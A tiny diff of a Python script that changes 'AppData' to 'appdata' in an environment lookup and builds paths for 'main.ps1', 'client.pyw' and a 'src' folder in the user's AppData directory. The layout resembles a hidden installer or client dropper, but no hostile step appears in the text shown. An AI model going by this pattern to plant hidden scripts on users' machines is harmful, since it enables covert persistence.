@@ -1,7 +1,7 @@
 import os, sys, subprocess
 
 username = os.environ.get('USERNAME')
-path = os.environ['AppData']
+path = os.environ['appdata']
 ps1_path = path + '\\main.ps1'
 file_path = path + '\\client.pyw'
 src_path = path + '\\src'
